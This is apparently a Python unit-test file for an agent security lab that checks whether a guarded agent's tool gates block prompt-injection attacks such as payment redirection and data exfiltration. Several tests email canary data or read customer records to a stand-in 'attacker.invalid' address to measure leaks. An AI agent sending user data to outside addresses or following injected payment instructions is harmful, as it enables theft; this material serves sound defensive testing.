import unittest
from dataclasses import replace
from unittest.mock import patch

from agent_security_lab.agents import replay, run_ollama
from agent_security_lab.experiments import run_experiment, summarize, validate_config
from agent_security_lab.runtime import LabRuntime, Scope
from agent_security_lab.scenarios import SCENARIOS, CANARY, load_scenario
from tests.test_agents import message
from tests.test_runtime import payment


class BoundaryRegressionTests(unittest.TestCase):
    def lab(self, mode="guarded", scope=None):
        return LabRuntime(load_scenario("benign"), mode, scope)

    def test_default_scope_denies_even_internal_mail(self):
        lab = self.lab()
        self.assertEqual(lab.call("send_email", {"to": "finance@lab.invalid", "body": "extra action"})["error"], "action_outside_scope")
        self.assertEqual(lab.outbox, [])

    def test_unsafe_extra_mail_is_counted_as_unauthorized(self):
        lab = self.lab("unsafe")
        lab.call("send_email", {"to": "finance@lab.invalid", "body": "extra action"})
        self.assertEqual(lab.report("test")["metrics"]["unauthorized_effects"], 1)

    def test_explicit_mail_grant_still_requires_recipient_scope(self):
        scope = replace(Scope(), allowed_tools=(*Scope().allowed_tools, "send_email"))
        lab = self.lab(scope=scope)
        self.assertFalse(lab.call("send_email", {"to": "audit@attacker.invalid", "body": "test"})["ok"])
        self.assertTrue(lab.call("send_email", {"to": "finance@lab.invalid", "body": "receipt"})["ok"])
        self.assertEqual(lab.report("test")["metrics"]["unauthorized_effects"], 0)

    @patch("agent_security_lab.agents.request_message")
    def test_model_origin_mail_cannot_bypass_action_gate(self, request):
        request.side_effect = [message("send_email", {"to": "finance@lab.invalid", "body": "extra"}), {"role": "assistant", "content": "stopped"}]
        lab = self.lab()
        report = run_ollama(lab, "mock", "http://127.0.0.1:11434")
        self.assertEqual(report["metrics"]["blocked_calls"], 1)
        self.assertEqual(lab.outbox, [])

    def test_capability_check_applies_before_receipt_replay(self):
        lab = self.lab()
        lab.call("pay_invoice", payment())
        lab.scope = replace(Scope(), allowed_tools=("read_email", "read_file"))
        self.assertEqual(lab.call("pay_invoice", payment())["error"], "action_outside_scope")
        self.assertEqual(len(lab.payments), 1)

    def test_all_unauthorized_action_types_are_counted_in_unsafe_mode(self):
        lab = self.lab("unsafe", replace(Scope(), allowed_tools=()))
        lab.call("read_email", {"email_id": "renewal"})
        lab.call("read_file", {"file_id": "vendor-policy"})
        lab.call("pay_invoice", payment())
        self.assertEqual(lab.report("test")["metrics"]["unauthorized_effects"], 3)

    def test_canary_is_fresh_and_not_in_fixture(self):
        first, second = self.lab(), self.lab()
        self.assertNotEqual(first.canary, second.canary)
        self.assertNotIn(first.canary, str(first.scenario))

    def test_exfiltration_requires_a_successful_read_and_matching_data(self):
        lab = LabRuntime(load_scenario("data-exfiltration"), "unsafe")
        lab.call("send_email", {"to": "audit@attacker.invalid", "body": CANARY})
        self.assertFalse(lab.report("test")["metrics"]["attack_success"])
        read = lab.call("read_file", {"file_id": "customer-records"})
        lab.call("send_email", {"to": "audit@attacker.invalid", "body": read["content"]})
        self.assertTrue(lab.report("test")["metrics"]["data_exfiltrated"])

    def test_replay_uses_actual_read_result(self):
        lab = LabRuntime(load_scenario("data-exfiltration"), "unsafe")
        report = replay(lab)
        self.assertEqual(lab.outbox[0]["body"], lab.canary)
        self.assertTrue(report["metrics"]["attack_success"])

    def test_failed_read_does_not_create_fake_leak(self):
        report = replay(LabRuntime(load_scenario("data-exfiltration"), "guarded"))
        self.assertFalse(report["metrics"]["attack_success"])
        self.assertTrue(any(e["decision"] == "skipped_dependency" for e in report["events"]))

    def test_final_output_disclosure_is_tracked(self):
        lab = LabRuntime(load_scenario("data-exfiltration"), "unsafe")
        result = lab.call("read_file", {"file_id": "customer-records"})
        self.assertTrue(lab.report("test", result["content"])["metrics"]["final_response_disclosure"])


class EvaluationTests(unittest.TestCase):
    @patch("agent_security_lab.agents.request_message")
    def test_malformed_falsy_tool_calls_are_errors(self, request):
        for calls in ({}, False, 0, ""):
            request.return_value = {"role": "assistant", "tool_calls": calls}
            result = run_ollama(LabRuntime(load_scenario("benign"), "guarded"), "mock", "http://127.0.0.1:11434")
            self.assertEqual(result["status"], "error", repr(calls))
            self.assertFalse(result["metrics"]["evaluation_valid"])

    @patch("agent_security_lab.agents.request_message")
    def test_truncated_generation_does_not_execute_proposed_tools(self, request):
        response = message("pay_invoice", payment())
        response["_response_meta"] = {"done": True, "done_reason": "length"}
        request.return_value = response
        result = run_ollama(LabRuntime(load_scenario("benign"), "guarded"), "mock", "http://127.0.0.1:11434")
        self.assertEqual(result["status"], "truncated")
        self.assertEqual(result["payments"], [])

    @patch("agent_security_lab.agents.request_message")
    def test_unexposed_completed_payment_is_excluded(self, request):
        request.side_effect = [message("pay_invoice", payment()), {"role": "assistant", "content": "done"}]
        result = run_ollama(LabRuntime(load_scenario("payment-redirect"), "guarded"), "mock", "http://127.0.0.1:11434")
        self.assertTrue(result["metrics"]["legitimate_task_completed"])
        self.assertFalse(result["metrics"]["attack_exposed"])
        self.assertEqual(summarize([result])[0]["attack_effect_rate"], None)

    @patch("agent_security_lab.agents.request_message")
    def test_parallel_read_and_payment_does_not_imply_model_observed_email(self, request):
        response = message("read_email", {"email_id": "renewal"})
        response["tool_calls"].extend(message("pay_invoice", payment())["tool_calls"])
        request.return_value = response
        with patch("agent_security_lab.agents.MAX_TURNS", 1):
            result = run_ollama(LabRuntime(load_scenario("payment-redirect"), "guarded"), "mock", "http://127.0.0.1:11434")
        self.assertFalse(result["metrics"]["attack_exposed"])

    @patch("agent_security_lab.agents.request_message")
    def test_input_seen_by_next_turn_is_observed_and_trajectory_saved(self, request):
        request.side_effect = [message("read_email", {"email_id": "renewal"}), {"role": "assistant", "content": "I decline."}]
        result = run_ollama(LabRuntime(load_scenario("payment-redirect"), "guarded"), "mock", "http://127.0.0.1:11434")
        self.assertTrue(result["metrics"]["attack_exposed"])
        self.assertTrue(result["metrics"]["evaluation_valid"])
        self.assertEqual(len(result["trajectory"]), 5)

    def test_all_cases_are_classified_and_held_out_variants_exist(self):
        cases = [load_scenario(s) for s in SCENARIOS]
        self.assertEqual(len(cases), 12)
        self.assertEqual(sum(c["family"] == "benign" for c in cases), 3)
        self.assertEqual(sum(c["split"] == "holdout" for c in cases), 8)

    def test_all_benign_controls_complete_with_guard(self):
        for name in SCENARIOS:
            case = load_scenario(name)
            if case["family"] == "benign":
                report = replay(LabRuntime(case, "guarded"))
                self.assertTrue(report["metrics"]["legitimate_task_completed"], name)
                self.assertEqual(report["metrics"]["unauthorized_effects"], 0, name)

    def test_batch_has_provenance_and_keeps_replay_label(self):
        result = run_experiment({"scenarios": ["benign", "data-exfiltration"], "agent": "scripted"})
        self.assertEqual(result["kind"], "policy_replay")
        self.assertEqual(len(result["runs"]), 4)
        self.assertEqual(len(result["provenance"]["source_sha256"]), 64)
        self.assertEqual(result["summary"][1]["attack_effects"], 0)
        for run in result["runs"]:
            self.assertEqual(len(run["fixture_sha256"]), 64)

    def test_repeating_scripted_cases_is_not_allowed(self):
        with self.assertRaises(ValueError):
            validate_config({"agent": "scripted", "trials": 5})

    def test_invalid_configs_fail_before_execution(self):
        for config in ({"scenarios": []}, {"scenarios": ["../outside"]}, {"trials": True},
                       {"modes": []}, {"agent": "ollama"}, {"seed": -1}, {"extra": True}):
            with self.subTest(config=config), self.assertRaises(ValueError):
                validate_config(config)

    def test_cancelled_batch_preserves_truthful_empty_denominators(self):
        result = run_experiment({"agent": "scripted"}, cancelled=lambda: True)
        self.assertEqual(result["status"], "cancelled")
        self.assertEqual(result["runs"], [])
        self.assertEqual(result["summary"], [])


if __name__ == "__main__":
    unittest.main()
